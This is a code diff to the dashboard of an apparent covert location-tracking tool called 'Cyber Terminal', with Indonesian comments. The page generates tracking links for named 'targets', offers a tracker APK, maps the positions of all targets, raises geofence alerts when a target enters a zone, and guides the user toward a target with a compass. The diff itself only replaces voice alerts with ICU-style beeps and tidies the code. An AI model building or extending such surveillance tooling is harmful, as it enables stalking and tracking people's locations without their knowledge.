@@ -20,19 +20,16 @@
 body{font-family:'Courier New',monospace;background:var(--bg);color:var(--text);min-height:100vh;padding:12px;overflow-x:hidden}
 body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,rgba(200,160,0,.012) 0px,rgba(200,160,0,.012) 1px,transparent 1px,transparent 4px);pointer-events:none;z-index:9999}
 .wrap{position:relative;z-index:2;max-width:620px;margin:0 auto;transition:max-width .3s ease}
-/* ── HEADER */
 .term-header{background:var(--bg2);border:1px solid var(--gold-d);border-bottom:none;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;font-size:11px;border-radius:var(--radius) var(--radius) 0 0}
 .term-header .dots{display:flex;gap:7px}
 .dot-win{width:10px;height:10px;border-radius:50%}
 .dot-win.r{background:#ff3355}.dot-win.y{background:#e8bc00}.dot-win.g{background:#00c853}
 .term-header .title{color:var(--gold);font-weight:bold;flex:1;text-align:center;letter-spacing:5px;font-size:12px;text-transform:uppercase}
-/* ── PANELS */
 .term-body{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--radius);padding:16px;margin-bottom:12px}
 .term-body.first{border-radius:0 0 var(--radius) var(--radius);border-top:1px solid var(--gold-d)}
 .welcome-video{width:100%;border:1px solid var(--gold-d);border-radius:var(--radius);display:block;margin-bottom:12px;background:#000}
 .prompt{color:var(--gold);font-size:10px;font-weight:bold;letter-spacing:3px;text-transform:uppercase;margin-bottom:14px;padding-bottom:8px;border-bottom:1px solid var(--gold-d)}
 .prompt::before{content:'◈  '}
-/* ── INPUTS / BUTTONS */
 .term-input{width:100%;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:13px;padding:11px 12px;outline:none;margin-bottom:10px;border-radius:var(--radius);transition:border-color .2s}
 .term-input:focus{border-color:var(--gold-d)}
 .term-input::placeholder{color:var(--text-d)}
@@ -41,7 +38,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .term-btn.outline{background:transparent;color:var(--gold);border:1px solid var(--gold-d)}
 .term-btn.outline:hover{border-color:var(--gold)}
 .term-btn.danger{background:transparent;color:var(--red);border:1px solid rgba(255,51,85,.35)}
-/* ── TOP BAR */
 .top-bar{display:flex;justify-content:space-between;align-items:center;font-size:10px;color:var(--text-d);margin-bottom:12px;letter-spacing:1px}
 .top-bar .time{color:var(--gold);font-weight:bold;font-size:12px;letter-spacing:2px}
 .logout-btn,.chat-btn,.sound-btn{background:transparent;font-family:'Courier New',monospace;font-size:10px;padding:5px 11px;cursor:pointer;border-radius:var(--radius);letter-spacing:1px}
@@ -51,7 +47,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .sound-btn.active{background:var(--green-d);color:var(--green);border-color:rgba(0,200,83,.3)}
 .dot-status{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);margin-right:6px;box-shadow:0 0 6px var(--green);animation:spulse 2s ease-in-out infinite}
 @keyframes spulse{0%,100%{opacity:1;box-shadow:0 0 6px var(--green)}50%{opacity:.6;box-shadow:0 0 2px var(--green)}}
-/* ── MAP */
 .map-box{position:relative;width:100%;height:300px;border:1px solid var(--gold-d);margin-bottom:14px;background:#000;overflow:hidden;border-radius:var(--radius)}
 .map-box.tall{height:360px}
 .map-box::before,.map-box::after{content:'';position:absolute;z-index:500;pointer-events:none;width:16px;height:16px}
@@ -60,26 +55,21 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .map-inner{position:absolute;inset:0;width:100%;height:100%}
 .map-label{position:absolute;top:8px;left:8px;background:rgba(0,0,0,.88);border:1px solid var(--gold-d);color:var(--gold);font-size:9px;font-weight:bold;letter-spacing:2px;padding:3px 8px;z-index:600;border-radius:2px}
 .map-coords{position:absolute;bottom:8px;left:8px;background:rgba(0,0,0,.88);border:1px solid var(--border2);color:var(--cyan);font-size:9px;letter-spacing:1px;padding:3px 8px;z-index:600;border-radius:2px}
-/* ── LEAFLET POPUP */
 .target-popup .leaflet-popup-content-wrapper{background:#000;border:1px solid var(--gold);border-radius:var(--radius);color:var(--gold);padding:0}
 .target-popup .leaflet-popup-tip{background:var(--gold)}
 .target-popup .leaflet-popup-close-button{display:none}
-/* ── STATS */
 .stats-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
 .stat-card{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius);padding:13px 12px;text-align:center}
 .stat-card.hi{border-color:var(--gold-d)}
 .stat-val{font-size:22px;font-weight:bold;color:var(--gold);line-height:1.2}
 .stat-val.sm{color:var(--cyan);font-size:12px;word-break:break-word}
 .stat-lbl{font-size:9px;color:var(--text-d);letter-spacing:2px;margin-top:4px;text-transform:uppercase}
-/* ── MULTI MAP MARKER */
 @keyframes mring{0%{transform:translate(-50%,-50%) scale(1);opacity:.9}100%{transform:translate(-50%,-50%) scale(2.6);opacity:0}}
-/* ── GEOFENCE */
 .geo-row{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
 .geo-inp{flex:1;min-width:80px;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:11px;padding:9px 10px;outline:none;border-radius:var(--radius)}
 .geo-inp::placeholder{color:var(--text-d)}
 .geo-status{font-size:10px;color:var(--text-d);padding:8px;background:var(--bg3);border-radius:var(--radius);margin-bottom:8px}
 .geo-alert{font-size:11px;font-weight:bold;padding:8px;background:rgba(255,51,85,.08);border:1px solid rgba(255,51,85,.2);border-radius:var(--radius);margin-top:8px;display:none}
-/* ── CARDS */
 .card-data{border:1px solid var(--border2);padding:12px;margin-bottom:10px;background:var(--bg3);border-radius:var(--radius)}
 .card-top{display:flex;justify-content:space-between;font-size:9px;color:var(--text-d);padding-bottom:8px;border-bottom:1px solid var(--border);margin-bottom:10px;letter-spacing:.5px}
 .card-uname{color:var(--gold);font-weight:bold;font-size:10px;letter-spacing:2px}
@@ -95,7 +85,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .card-actions button.del:hover{border-color:var(--red)}
 .card-note{width:100%;background:var(--bg);border:1px solid var(--border);color:var(--text-d);font-family:'Courier New',monospace;font-size:10px;padding:8px;outline:none;resize:vertical;min-height:40px;border-radius:var(--radius);margin-top:8px}
 .card-note:focus{border-color:var(--gold-d);color:var(--text)}
-/* ── MISC */
 .log-line{font-size:10px;color:#484848;padding:3px 0 3px 10px;border-left:2px solid var(--border2);margin-bottom:3px;letter-spacing:.5px}
 .log-line.warn{border-color:var(--amber);color:var(--amber)}
 .log-line.err{border-color:var(--red);color:var(--red)}
@@ -112,7 +101,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .apk-steps div::before{content:'›  ';color:var(--gold)}
 @keyframes sweepRotate{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
 ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-track{background:var(--bg)}::-webkit-scrollbar-thumb{background:var(--gold-d);border-radius:2px}
-/* ── CHAT */
 .chat-panel{position:fixed;inset:0;background:var(--bg);z-index:99999;display:none;flex-direction:column;padding:10px}
 .chat-panel.show{display:flex}
 .chat-inner{max-width:620px;margin:0 auto;width:100%;height:100%;display:flex;flex-direction:column;border:1px solid var(--gold-d);border-radius:var(--radius);overflow:hidden}
@@ -133,7 +121,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .chat-input-row{display:flex;background:var(--bg2);border-top:1px solid var(--gold-d);padding:10px;gap:8px}
 .chat-input-row input{flex:1;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:12px;padding:10px 12px;outline:none;border-radius:var(--radius)}
 .chat-input-row button{background:var(--gold);color:#000;border:none;font-family:'Courier New',monospace;font-size:11px;font-weight:bold;letter-spacing:2px;padding:0 18px;cursor:pointer;border-radius:var(--radius)}
-/* ── COMPASS */
 .cmp-wrap{display:flex;gap:14px;align-items:center;justify-content:center;flex-wrap:wrap}
 .cmp-dial{position:relative;width:190px;height:190px;border-radius:50%;background:radial-gradient(circle at 50% 50%,#101010 0%,#050505 70%);border:2px solid var(--gold-d);flex-shrink:0;overflow:hidden}
 .cmp-ticks{position:absolute;inset:6px;border-radius:50%;background:repeating-conic-gradient(from 0deg,rgba(200,160,0,.5) 0deg .6deg,transparent .6deg 15deg);-webkit-mask:radial-gradient(circle,transparent 62%,#000 63%);mask:radial-gradient(circle,transparent 62%,#000 63%)}
@@ -154,18 +141,9 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .cmp-dist{font-size:30px;font-weight:bold;color:var(--gold);letter-spacing:1px}
 .cmp-sub{font-size:11px;color:var(--cyan);margin-top:4px;letter-spacing:2px}
 
-/* =========================================
-   RESPONSIVE DESKTOP
-   ========================================= */
 @media (min-width:900px){
   body{padding:20px}
-  .wrap{
-    max-width:1100px;
-    display:grid;
-    grid-template-columns:repeat(2,1fr);
-    gap:14px;
-    align-items:start;
-  }
+  .wrap{max-width:1100px;display:grid;grid-template-columns:repeat(2,1fr);gap:14px;align-items:start}
   .term-header{grid-column:1 / -1}
   .term-body.first{grid-column:1 / -1}
   .term-body:has(#mapMulti){grid-column:1 / -1}
@@ -187,11 +165,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   .stats-grid{grid-template-columns:repeat(4,1fr)}
 }
 
-/* =========================================
-   FITUR TAMBAHAN HACKER
-   ========================================= */
-
-/* ── BOOT SEQUENCE ── */
 #bootScreen{position:fixed;inset:0;background:#000;z-index:999999;display:flex;flex-direction:column;justify-content:center;align-items:center;font-family:'Courier New',monospace;color:#00ff41;padding:20px;overflow:hidden}
 #bootScreen.hide{opacity:0;pointer-events:none;transition:opacity .8s ease}
 #bootScreen .boot-logo{font-size:26px;font-weight:bold;letter-spacing:8px;color:#c8a000;text-shadow:0 0 12px #c8a000;margin-bottom:20px;animation:bootGlow 1.5s ease-in-out infinite}
@@ -204,7 +177,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 #bootScreen .boot-pct{font-size:10px;color:#c8a000;margin-top:8px;letter-spacing:3px}
 #bootScreen .scanlines{position:absolute;inset:0;background:repeating-linear-gradient(0deg,rgba(0,255,65,.04) 0px,rgba(0,255,65,.04) 1px,transparent 1px,transparent 3px);pointer-events:none}
 
-/* ── BATTERY + NETWORK ── */
 .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px}
 .info-card{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius);padding:10px;font-size:10px}
 .info-card .ik{color:var(--text-d);letter-spacing:1px;font-size:9px;text-transform:uppercase}
@@ -212,7 +184,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .bat-bar{width:100%;height:6px;background:var(--bg);border:1px solid var(--border2);border-radius:2px;margin-top:5px;overflow:hidden}
 .bat-fill{height:100%;background:linear-gradient(90deg,#00c853,#e8bc00);transition:width .3s}
 
-/* ── DECRYPTING OVERLAY ── */
 #decryptOverlay{position:fixed;inset:0;background:rgba(0,0,0,.92);z-index:99998;display:none;justify-content:center;align-items:center;flex-direction:column;font-family:'Courier New',monospace;color:#00ff41}
 #decryptOverlay.show{display:flex}
 #decryptOverlay .dc-title{font-size:16px;letter-spacing:6px;color:#c8a000;margin-bottom:20px;animation:bootGlow 1s infinite}
@@ -221,32 +192,27 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 #decryptOverlay .dc-fill{height:100%;width:0%;background:#00ff41;box-shadow:0 0 12px #00ff41;transition:width .1s}
 #decryptOverlay .dc-pct{font-size:11px;color:#00ff41;margin-top:8px;letter-spacing:3px}
 
-/* ── VOLUME SLIDER ── */
 .vol-wrap{display:flex;align-items:center;gap:8px;margin-top:8px}
 .vol-wrap input[type=range]{-webkit-appearance:none;appearance:none;flex:1;height:4px;background:var(--border2);border-radius:2px;outline:none}
 .vol-wrap input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:14px;height:14px;background:var(--gold);border-radius:50%;cursor:pointer;box-shadow:0 0 6px var(--gold)}
 .vol-wrap input[type=range]::-moz-range-thumb{width:14px;height:14px;background:var(--gold);border:none;border-radius:50%;cursor:pointer}
 .vol-wrap .vl{font-size:9px;color:var(--text-d);letter-spacing:1px;min-width:34px}
 
-/* ── RADAR SWEEP ── */
 .term-body{position:relative;overflow:hidden}
 .term-body::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:conic-gradient(from 0deg,transparent 0deg,transparent 300deg,rgba(200,160,0,.06) 330deg,rgba(200,160,0,.15) 355deg,transparent 360deg);animation:sweepRotate 6s linear infinite;pointer-events:none;z-index:0;opacity:.5}
 .term-body>*{position:relative;z-index:1}
 
-/* ── IP INFO PANEL ── */
 .ip-grid{display:grid;grid-template-columns:1fr;gap:6px;font-size:10px;margin-top:8px}
 .ip-row{display:flex;justify-content:space-between;padding:6px 10px;background:var(--bg3);border-left:2px solid var(--gold-d);border-radius:0 var(--radius) var(--radius) 0}
 .ip-row .ipk{color:var(--text-d);letter-spacing:1px}
 .ip-row .ipv{color:var(--cyan);font-weight:bold}
 
-/* ── CLOCK 3-IN-1 ── */
 .clock-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;margin-top:8px}
 .clock-card{background:var(--bg3);border:1px solid var(--border2);border-radius:var(--radius);padding:8px 6px;text-align:center}
 .clock-card .clk-l{font-size:8px;color:var(--text-d);letter-spacing:2px;text-transform:uppercase}
 .clock-card .clk-v{font-size:13px;color:var(--gold);font-weight:bold;margin-top:4px;letter-spacing:1px;font-variant-numeric:tabular-nums}
 .clock-card .clk-v.cy{color:var(--cyan)}
 
-/* ── SATELLITE UPLINK ── */
 .sat-panel{background:#000;border:1px solid var(--gold-d);border-radius:var(--radius);padding:12px;font-size:10px;margin-top:10px;position:relative;overflow:hidden}
 .sat-panel .sat-title{color:var(--gold);letter-spacing:3px;font-size:10px;font-weight:bold;margin-bottom:8px}
 .sat-bars{display:flex;gap:3px;align-items:flex-end;height:40px;margin-bottom:8px}
@@ -264,7 +230,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 </head>
 <body>
 
-<!-- BOOT SEQUENCE -->
 <div id="bootScreen">
   <div class="scanlines"></div>
   <div class="boot-logo">CYBER TERMINAL</div>
@@ -273,7 +238,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   <div class="boot-pct" id="bootPct">BOOTING 0%</div>
 </div>
 
-<!-- DECRYPTING OVERLAY -->
 <div id="decryptOverlay">
   <div class="dc-title">◈ DECRYPTING DATA STREAM ◈</div>
   <div class="dc-hex" id="dcHex">01001000 01100001 01100011 01101011</div>
@@ -283,14 +247,12 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 
 <div class="wrap">
 
-<!-- HEADER -->
 <div class="term-header">
   <div class="dots"><div class="dot-win r"></div><div class="dot-win y"></div><div class="dot-win g"></div></div>
   <div class="title">Cyber Terminal</div>
   <div style="width:40px"></div>
 </div>
 
-<!-- MAIN -->
 <div class="term-body first" style="padding:14px">
   <div class="top-bar">
     <div>USER&nbsp;<span id="userLabel" style="color:var(--cyan)">...</span></div>
@@ -309,7 +271,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- STATS -->
 <div class="term-body">
   <div class="prompt">[Analytics] Overview</div>
   <div class="stats-grid">
@@ -320,7 +281,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- SATELLITE UPLINK (BARU) -->
 <div class="term-body">
   <div class="prompt">[Uplink] Satellite Connection</div>
   <div class="sat-panel">
@@ -337,7 +297,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- CLOCK 3-IN-1 (BARU) -->
 <div class="term-body">
   <div class="prompt">[Time] Sinkronisasi Waktu</div>
   <div class="clock-grid">
@@ -347,7 +306,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- IP INFO (BARU) -->
 <div class="term-body">
   <div class="prompt">[Network] Identitas Koneksi</div>
   <div class="ip-grid">
@@ -359,7 +317,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- BATTERY + NETWORK (BARU) -->
 <div class="term-body">
   <div class="prompt">[Device] Status Perangkat</div>
   <div class="info-grid">
@@ -370,7 +327,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- VOLUME SLIDER (BARU) -->
 <div class="term-body">
   <div class="prompt">[Audio] Kontrol Suara</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› atur volume alert & beep:</div>
@@ -381,7 +337,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- LIVE MULTI-MAP -->
 <div class="term-body">
   <div class="prompt">[Live] All Targets Map</div>
   <div class="map-box tall">
@@ -391,7 +346,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- GEOFENCE -->
 <div class="term-body">
   <div class="prompt">[Alert] Geofence Monitor</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Set titik + radius — alert bunyi + voice kalau target masuk zona.</div>
@@ -408,7 +362,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   <div class="geo-alert" id="geoAlert"></div>
 </div>
 
-<!-- GENERATE LINK -->
 <div class="term-body">
   <div class="prompt">[Generate] Tracking Link</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:8px">› input target name:</div>
@@ -428,7 +381,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- TARGET LOCATION -->
 <div class="term-body">
   <div class="prompt">[Data] Target Location</div>
   <div class="map-box" id="mapLinkBox">
@@ -456,7 +408,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
-<!-- APK MONITOR -->
 <div class="term-body">
   <div class="prompt">[Monitor] APK Location</div>
   <div class="map-box">
@@ -475,7 +426,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   <button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">[ Buka Google Maps ]</button>
 </div>
 
-<!-- INSTALL APK -->
 <div class="term-body">
   <div class="prompt">[Tools] Install Tracker APK</div>
   <div class="term-info">
@@ -489,13 +439,11 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </a>
 </div>
 
-<!-- LOG -->
 <div class="term-body">
   <div class="prompt">[System] Log</div>
   <div id="logBox"><div class="log-line">Initializing...</div></div>
 </div>
 
-<!-- COMPASS -->
 <div class="term-body" id="compassPanel">
   <div class="prompt">[Nav] Kompas Target</div>
   <div style="font-size:10px;color:var(--text-d);margin-bottom:10px">› isi koordinat tujuan, klik MULAI, ikuti jarum + jarak.</div>
@@ -549,7 +497,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 </div>
 </div>
 
-<!-- CHAT -->
 <div class="chat-panel" id="chatPanel">
   <div class="chat-inner">
     <div class="chat-head">
@@ -565,6 +512,80 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
   </div>
 </div>
 
+<script>
+/* ═══════════════════════════════════════════════════════════
+   ICU SOUND ENGINE — pengganti suara cewek
+   Menghasilkan bunyi monitor ICU rumah sakit: "tit... tiit... tiit..."
+   ═══════════════════════════════════════════════════════════ */
+window._icuCtx = null;
+window._icuActive = false;
+window._icuTimeouts = [];
+
+function _icuGetCtx(){
+  if(!window._icuCtx){
+    try{ window._icuCtx = new (window.AudioContext || window.webkitAudioContext)(); }catch(e){}
+  }
+  if(window._icuCtx && window._icuCtx.state === 'suspended'){ window._icuCtx.resume(); }
+  return window._icuCtx;
+}
+
+/* Satu "tit" — pulse pendek ala monitor ICU (square/sine, freq tinggi, decay cepat) */
+function _icuBeep(freq, dur, vol){
+  var ctx = _icuGetCtx();
+  if(!ctx) return;
+  try{
+    var o = ctx.createOscillator();
+    var g = ctx.createGain();
+    o.type = 'square';
+    o.frequency.value = freq;
+    var now = ctx.currentTime;
+    g.gain.setValueAtTime(0, now);
+    g.gain.linearRampToValueAtTime(vol, now + 0.005);
+    g.gain.exponentialRampToValueAtTime(0.0001, now + dur);
+    o.connect(g); g.connect(ctx.destination);
+    o.start(now); o.stop(now + dur + 0.02);
+  }catch(e){}
+}
+
+/* Pola ICU: tit tunggal diulang cepat, jeda, lalu triplet "tiit-tiit-tiit" */
+function _icuPatternOnce(vol){
+  /* "tit" pembuka */
+  _icuBeep(1046, 0.06, vol);              /* C6 */
+  window._icuTimeouts.push(setTimeout(function(){ _icuBeep(1046, 0.06, vol); }, 180));
+  window._icuTimeouts.push(setTimeout(function(){ _icuBeep(1046, 0.06, vol); }, 360));
+  /* "tiit tiit tiit" tinggi */
+  window._icuTimeouts.push(setTimeout(function(){ _icuBeep(1568, 0.08, vol); }, 700));  /* G6 */
+  window._icuTimeouts.push(setTimeout(function(){ _icuBeep(1568, 0.08, vol); }, 880));
+  window._icuTimeouts.push(setTimeout(function(){ _icuBeep(1568, 0.08, vol); }, 1060));
+}
+
+/* Mulai loop ICU selama durasi tertentu (ms) */
+function icuStart(durationMs, vol){
+  icuStop();
+  window._icuActive = true;
+  vol = vol || 0.15;
+  var start = Date.now();
+  function loop(){
+    if(!window._icuActive) return;
+    if(Date.now() - start > durationMs){ icuStop(); return; }
+    _icuPatternOnce(vol);
+    window._icuTimeouts.push(setTimeout(loop, 1600));
+  }
+  loop();
+}
+
+/* Stop ICU loop */
+function icuStop(){
+  window._icuActive = false;
+  window._icuTimeouts.forEach(function(t){ clearTimeout(t); });
+  window._icuTimeouts = [];
+}
+
+/* Ekspos global agar bisa dipanggil dari script module */
+window.icuStart = icuStart;
+window.icuStop = icuStop;
+</script>
+
 <script type="module">
 import{initializeApp}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import{getDatabase,ref,onValue,push,remove}from"https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
@@ -573,40 +594,32 @@ const app=initializeApp(FC);const db=getDatabase(app);
 const user=localStorage.getItem('username');if(!user)location.href='index.html';
 document.getElementById('userLabel').innerText=user;
 
-// VIDEO
 const wv=document.getElementById('welcomeVideo');
 if(wv){wv.muted=true;wv.volume=0;wv.play().catch(()=>{document.body.addEventListener('click',function o(){wv.play();document.body.removeEventListener('click',o)},{once:true})});wv.addEventListener('ended',()=>{wv.currentTime=0;wv.play()})}
 
-// SOUND
 let soundEnabled=localStorage.getItem('soundEnabled')!=='false';
-window.toggleSound=()=>{soundEnabled=!soundEnabled;localStorage.setItem('soundEnabled',soundEnabled);const b=document.getElementById('soundToggle');if(soundEnabled){b.innerText='🔊 ON';b.classList.add('active')}else{b.innerText='🔇 OFF';b.classList.remove('active')}};
+window.toggleSound=()=>{soundEnabled=!soundEnabled;localStorage.setItem('soundEnabled',soundEnabled);const b=document.getElementById('soundToggle');if(soundEnabled){b.innerText='🔊 ON';b.classList.add('active')}else{b.innerText='🔇 OFF';b.classList.remove('active');if(window.icuStop)window.icuStop();}};
 setTimeout(()=>{const b=document.getElementById('soundToggle');soundEnabled?b.classList.add('active'):b.classList.remove('active')},100);
 function beep(f,d){if(!soundEnabled)return;try{const ac=new(window.AudioContext||window.webkitAudioContext)();const o=ac.createOscillator();const g=ac.createGain();o.type='sine';o.frequency.value=f;o.connect(g);g.connect(ac.destination);g.gain.setValueAtTime(0.12,ac.currentTime);g.gain.exponentialRampToValueAtTime(0.001,ac.currentTime+d);o.start();o.stop(ac.currentTime+d)}catch(e){}}
 function playKlik(){beep(2200,0.03)}
 function typingSound(){beep(1800+Math.random()*400,0.02)}
-function targetLockedSound(){let n=0;const t=setInterval(()=>{beep(1600,0.08);setTimeout(()=>beep(2000,0.08),80);n++;if(n>=20)clearInterval(t)},500)}
+function targetLockedSound(){if(!soundEnabled)return;if(window.icuStart)window.icuStart(11000,0.18);}
 function apkUpdateSound(){let n=0;const t=setInterval(()=>{beep(1200,0.06);n++;if(n>=15)clearInterval(t)},333)}
 function chatNotifSound(){let n=0;const t=setInterval(()=>{beep(1800,0.08);setTimeout(()=>beep(2400,0.08),100);n++;if(n>=6)clearInterval(t)},500)}
 function linkDataSound(){let n=0;const t=setInterval(()=>{beep(1400,0.08);setTimeout(()=>beep(1800,0.08),100);n++;if(n>=10)clearInterval(t)},500)}
-function geoSound(){beep(800,.15);setTimeout(()=>beep(1200,.15),200);setTimeout(()=>beep(1600,.2),400);setTimeout(()=>beep(2000,.3),700)}
+function geoSound(){if(!soundEnabled)return;if(window.icuStart)window.icuStart(7000,0.20);}
 
-// VOICE
-let voice=null;
-function loadVoice(){if(!window.speechSynthesis)return;const vs=window.speechSynthesis.getVoices();voice=vs.find(x=>x.lang.includes('id')&&x.name.toLowerCase().includes('female'))||vs.find(x=>x.lang.includes('id'))||vs.find(x=>x.name.toLowerCase().includes('female'))||vs[0]}
-if(window.speechSynthesis){window.speechSynthesis.onvoiceschanged=loadVoice;loadVoice()}
-function ucapkan(t){if(!window.speechSynthesis)return;try{window.speechSynthesis.cancel();const u=new SpeechSynthesisUtterance(t);if(voice)u.voice=voice;u.rate=1;u.pitch=1.4;u.volume=1;u.lang='id-ID';window.speechSynthesis.speak(u)}catch(e){}}
-function hackerVoice(){ucapkan('Initiating satellite scan.');setTimeout(()=>ucapkan('Locating target position.'),2200);setTimeout(()=>ucapkan('Coordinates locked.'),4500);setTimeout(()=>ucapkan('Target acquired.'),6500)}
+/* ── VOICE CEWEK: DIMATIKAN TOTAL (dibiarkan kosong agar tidak error kalau dipanggil) ── */
+function ucapkan(t){ /* VOICE CEWEK DIMATIKAN — diganti ICU sound */ }
+function hackerVoice(){ /* VOICE CEWEK DIMATIKAN — targetLockedSound() sudah memicu ICU sound */ }
 
 window.logout=()=>{playKlik();localStorage.removeItem('username');location.href='index.html'};
 
-// CLOCK
 setInterval(()=>{const n=new Date();document.getElementById('liveClock').innerText=String(n.getHours()).padStart(2,'0')+':'+String(n.getMinutes()).padStart(2,'0')+':'+String(n.getSeconds()).padStart(2,'0')},1000);
 
-// LOG
 function addLog(msg,type){const b=document.getElementById('logBox');const l=document.createElement('div');l.className='log-line '+(type||'');l.innerText='['+new Date().toLocaleTimeString('id-ID')+'] '+msg;b.appendChild(l);while(b.children.length>20)b.removeChild(b.firstChild)}
 addLog('Terminal v2 ready — user: '+user);
 
-// TILE LAYERS
 const SAT_URL='https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}';
 const LBL_URL='https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}';
 function addSatLayer(map){
@@ -621,9 +634,7 @@ function pinIcon(foto,name,color){
     ?`<image href="${foto}" x="9" y="8" width="36" height="36" clip-path="url(#cp)" preserveAspectRatio="xMidYMid slice"/>`
     :`<text x="27" y="31" text-anchor="middle" font-family="Courier New" font-size="15" font-weight="bold" fill="#000">${ini}</text>`;
   const svg=`<svg width="54" height="72" viewBox="0 0 54 72" xmlns="http://www.w3.org/2000/svg">
-    <defs>
-      <clipPath id="cp"><circle cx="27" cy="26" r="17"/></clipPath>
-    </defs>
+    <defs><clipPath id="cp"><circle cx="27" cy="26" r="17"/></clipPath></defs>
     <path d="M27 1C13.2 1 2 12.2 2 26C2 44 27 71 27 71C27 71 52 44 52 26C52 12.2 40.8 1 27 1Z" fill="${color}" stroke="rgba(0,0,0,.4)" stroke-width="1.5"/>
     <circle cx="27" cy="26" r="19" fill="white"/>
     <circle cx="27" cy="26" r="17" fill="${foto?'transparent':'#f0f0f0'}"/>
@@ -632,10 +643,7 @@ function pinIcon(foto,name,color){
   </svg>`;
   return L.divIcon({
     html:`<div style="text-align:center">${svg}<div style="font-family:'Courier New';font-size:9px;color:#c8a000;font-weight:bold;letter-spacing:1px;margin-top:1px;white-space:nowrap;background:rgba(0,0,0,.88);padding:2px 5px;border:1px solid #4a3a00;border-radius:2px;display:inline-block">${(name||'').toUpperCase()}</div></div>`,
-    className:'',
-    iconSize:[80,92],
-    iconAnchor:[40,71],
-    popupAnchor:[0,-72]
+    className:'',iconSize:[80,92],iconAnchor:[40,71],popupAnchor:[0,-72]
   });
 }
 
@@ -744,7 +752,6 @@ function animasiMapLink(lat,lng,target,foto){
       mapLink.dragging.enable();
       mapLink.scrollWheelZoom.enable();
       targetLockedSound();
-      hackerVoice();
       addLog('🎯 Target locked: '+target);
       return;
     }
@@ -785,7 +792,7 @@ function checkGeofence(){
       geoAlerted.add(key);localStorage.setItem('geoAlerted_'+user,JSON.stringify([...geoAlerted]));
       const nm=(d.target||'unknown').toUpperCase();
       addLog('🚨 GEOFENCE! '+nm+' dalam '+Math.round(dist)+'m','warn');
-      geoSound();ucapkan('Target '+nm+' masuk zona. Jarak '+Math.round(dist)+' meter.');
+      geoSound();
       const al=document.getElementById('geoAlert');al.style.display='block';al.style.color='var(--red)';
       al.innerText='🚨 '+nm+' DALAM ZONA ('+Math.round(dist)+'m) — '+new Date().toLocaleTimeString('id-ID');
     }
@@ -1072,7 +1079,7 @@ function updateCompass(){
   document.getElementById('cmpHead').innerText=head!=null?(Math.round(head)+'° ('+src+')'):'kalibrasi — gerakkan HP';
   if(dist<=25){
     cmpStatus('◉ SAMPAI DI LOKASI TUJUAN');
-    if(!cmpArrived){cmpArrived=true;try{geoSound();ucapkan('Sampai di lokasi tujuan')}catch(e){}}
+    if(!cmpArrived){cmpArrived=true;geoSound();}
   }else{
